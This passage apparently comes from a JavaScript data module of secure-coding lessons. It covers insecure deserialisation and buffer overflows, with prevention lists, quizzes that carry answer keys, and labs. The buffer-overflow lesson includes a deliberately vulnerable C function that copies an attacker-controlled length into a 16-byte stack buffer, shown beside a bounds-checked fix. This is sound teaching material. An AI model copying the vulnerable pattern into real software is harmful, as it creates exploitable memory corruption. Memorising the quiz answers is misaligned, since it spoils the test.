//    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
//        "com.myapp.dto.*;maxdepth=5;maxrefs=100;");
//    ois.setObjectInputFilter(filter);
// and sign the bytes (see the integrity-failures profile).`,
      explanation:
        "Data-only formats break the attack because there is no type information to abuse. If native serialisation is unavoidable, an ObjectInputFilter allow-lists the classes that may be constructed, and cryptographic signing - not just encoding - proves the bytes came from your own server."
    },
    prevention: [
      "Never deserialise untrusted data with a format that supports arbitrary types or code execution.",
      "Use JSON or another declarative format with an explicit schema, and enable strict/unknown-field handling.",
      "If native serialisation is required, apply an allow-list filter (ObjectInputFilter, or the language equivalent) and sign the payload.",
      "Sign session cookies and tokens with a strong MAC so they cannot be modified.",
      "Keep dependencies small and patched - gadget chains exist precisely because popular libraries provide convenient serialisable classes.",
      "Limit object graph depth, array sizes and total bytes to stop memory-exhaustion attacks."
    ],
    securePractices: [
      "Ask what types the format can create. If the answer is 'any', the format is dangerous.",
      "Treat every deserialisation call site as a security boundary and put it behind one reviewed helper.",
      "Add a test that feeds a known-gadget payload and asserts it is rejected.",
      "Remember integrity and deserialisation are the same family: if the bytes can change, anything they describe can change."
    ],
    furtherReading: [
      "OWASP Deserialization Cheat Sheet",
      "OWASP Insecure Deserialization"
    ],
    quiz: [
      {
        question: "What makes deserialisation dangerous?",
        options: [
          "It is slow",
          "The data can specify which types to instantiate, and construction itself can trigger actions",
          "It uses too much memory",
          "It requires a database"
        ],
        correctIndex: 1,
        explanation:
          "Type information in the payload becomes behaviour. Switching to a data-only format removes that capability."
      },
      {
        question: "Why is a signed cookie or token an important related control?",
        options: [
          "It makes the cookie smaller",
          "It proves the bytes were issued by your server and were not modified, so a tampered payload never reaches the deserialiser",
          "It encrypts the user id",
          "It prevents CSRF"
        ],
        correctIndex: 1,
        explanation:
          "Integrity (a signature) and safe parsing (a data-only format) solve different halves. Both are cheap; use both."
      }
    ],
    lab: {
      title: "Find the deserialisation boundary in an app",
      type: "design-review",
      task:
        "Search a small project (or write a checklist) for every place bytes become objects, and classify each as safe or dangerous.",
      steps: [
        "Grep for readObject, ObjectInputStream, pickle.loads, yaml.load, node-serialize, unserialize, JSON.parse of signed data.",
        "For each hit, ask: can the bytes come from the client, a cookie, a queue or a shared cache?",
        "Mark dangerous ones, and write the data-only replacement.",
        "For one case, add a signature and describe what it protects."
      ],
      hint: "A shared Redis cache is untrusted if any other application can write to it.",
      solution:
        "Every deserialisation of data that crossed a trust boundary - client, cookie, queue, shared cache, message broker - is a candidate. Replace native formats with JSON plus a strict schema; where that is impossible, allow-list the permitted types and sign the bytes. Also note the special case: caches and queues are often treated as 'inside' the trust boundary, but a bug or a second application can write there, so treat them as untrusted too.",
      isSafe: true,
      estimatedMinutes: 20
    }
  },

  /* ---------------------------------------------------------------- */
  "buffer-overflow": {
    title: "Buffer Overflows",
    relatedConcepts: ["injection", "vulnerable-components", "insecure-design"],
    simpleExplanation:
      "A buffer overflow happens when a program writes more data into a fixed-size memory area than it can hold, overwriting neighbouring memory. If the overwritten memory is later used as a code pointer, an attacker can make the program run their own code. This was a Top 10 category in 2003 and 2004, and it drove decades of compiler and operating-system hardening.",
    whyItHappens:
      "Legacy C and C++ ask the programmer to manage memory manually, and both languages have no built-in bounds checking. A function copies a caller-supplied length into a fixed buffer, and nothing verifies the length first. Modern managed languages removed the whole class; what remains is native code, drivers, and interoperability boundaries.",
    howItWorks:
      "1. A function declares char buf[16]. 2. It copies 64 bytes into it. 3. The 48 extra bytes overwrite the return address on the stack. 4. The function returns to the attacker's address instead. With stack canaries, ASLR and NX, the attack is much harder - which is why these mitigations exist.",
    safeExample:
      "It is a 10-cent envelope and a 50-cent letter. The post office trusts the sender to fit the letter in, and the torn envelope takes the neighbouring letters with it. Envelope size limits, plus a check that the letter fits, is the equivalent of bounds checking.",
    impact: [
      "Arbitrary code execution with the privileges of the process.",
      "Crashes (denial of service) far more often than successful exploitation.",
      "Corruption of adjacent data structures causing undefined behaviour.",
      "In sandboxes or embedded devices, escapes into the wider system."
    ],
    typicalSeverity: "critical",
    vulnerableCode: {
      language: "c",
      filename: "native-parser.c - IN SAFE",
      code: `#include <string.h>

/* No bounds check: if length > 16 we write past the end of buf,
   overwriting whatever sits next to it on the stack. */
void copy_name(char *input, int length) {
    char buf[16];
    memcpy(buf, input, length);   /* BUG: length is attacker controlled */
    use_name(buf);
}`,
      walkthrough: [
        "buf is 16 bytes. length comes from the network in a real parser.",
        "memcpy does not care: it copies exactly as many bytes as asked.",
        "The overflow overwrites the saved frame, the return address and other locals - 'smashing the stack'.",
        "A bounds check, or a length-limited copy such as strncpy plus an explicit check, removes the class of bug."
      ]
    },
    secureCode: {
      language: "c",
      filename: "native-parser.c - SAFE",
      code: `#include <string.h>
#include <stdint.h>

/* 1) Size the buffer from the protocol, not from a guess. */
#define MAX_NAME 32

void copy_name(const char *input, size_t input_len) {
    char buf[MAX_NAME];

    /* 2) Check BEFORE copying. The check must compare the REAL
       length received on the wire, not a number the client claimed. */
    if (input == NULL || input_len >= sizeof(buf)) {
        return;                       /* reject: never truncate silently */
    }
    memcpy(buf, input, input_len);
    buf[input_len] = '\\0';           /* 3) always terminate */
    use_name(buf);
}

/* 4) Even better: skip C entirely for this logic, or use a
   language with bounds checking. */

/* 5) Compile with the modern mitigations that turn a bug into a crash:
   gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie \\
       -Wl,-z,relro,-z,now
   plus ASLR (kernel) and NX / W^X (no stack execution). */`,
      explanation:
        "The only reliable fix is to verify the length before copying, using the actual number of bytes received. Truncating silently is a bug of its own because callers may act on a partial value. The compiler mitigations listed are not a fix - they are the reason modern exploitation is expensive, so enable them everywhere."
    },
    prevention: [
      "Prefer memory-safe languages for anything you write; keep native code small and isolated.",
      "Check lengths before every copy, and size buffers from the protocol definition.",
      "Use bounded APIs: snprintf over sprintf, strlcpy over strcpy, vector and slice operations over raw pointers.",
      "Always terminate strings explicitly where the language allows.",
      "Enable stack canaries, ASLR, NX/W^X, RELRO and FORTIFY_SOURCE, and turn off core dumps for privileged services.",
      "Run fuzzers on parsers and protocol handlers - overflows are found by fuzzing far more often than by reading code.",
      "Prefer managed containers or a memory-safe sandbox for untrusted parsing."
    ],
    securePractices: [
      "If a task can be done safely in a managed language, doing it in C is a choice, not a necessity.",
      "Audit third-party native dependencies: they are where most real overflows live.",
      "Add compiler hardening flags to CI so a new project inherits them.",
      "Treat every crash in a native component as a potential memory-safety incident until proven otherwise."
    ],
    furtherReading: [
      "OWASP Buffer Overflows (historic category)",
      "CERT C and C++ Secure Coding Standard",
      "Compiler hardening guides for GCC and Clang"
    ],
    quiz: [
      {
        question: "What is the root cause of a buffer overflow?",
        options: [
          "The network is slow",
          "A copy operation writes beyond the bounds of a fixed-size buffer because nobody checked the length first",
          "The compiler is old",
          "Too many users"
        ],
        correctIndex: 1,
        explanation:
          "It is always a missing bounds check before a copy. Language-level safety and compiler mitigations exist to make that mistake survivable."
      },
      {
        question: "Which of these is the strongest defence?",
        options: [
          "ASLR",
          "Using a memory-safe language or checked containers, so the copy cannot go out of bounds",
          "Obfuscating the code",
          "Adding a longer timeout"
        ],
        correctIndex: 1,
        explanation:
          "ASLR and NX raise the cost of exploitation. Eliminating unchecked copies removes the bug. Best: do both, starting with eliminating it."
      }
    ],
    lab: {
      title: "Bounds-check audit of a C snippet",
      type: "identify-the-bug",
      task:
        "Given eight small C functions, decide which can write out of bounds and write the corrected version of each.",
      steps: [
        "For each function, identify the destination buffer and its real size.",
        "Identify where the length or count comes from, and whether it is checked first.",
        "Write the fix using a bounded API, and state what happens if the input is too long.",
        "List the compiler flags you would enable and explain what each one buys you."
      ],
      hint: "A return value you ignore is a length check you did not do.",
      solution:
        "For each function, compare the destination size with the maximum possible source length BEFORE copying, reject rather than silently truncate, and terminate the string. Then add -fstack-protector-strong, -D_FORTIFY_SOURCE=2, PIE, full RELRO, ASLR and NX, and fuzz the parser. The real lesson for a web developer: keep native code behind a boundary, and prefer memory-safe languages for anything you own.",
      isSafe: true,
      estimatedMinutes: 25
    }
  },
};

module.exports = attackFamilyProfiles;
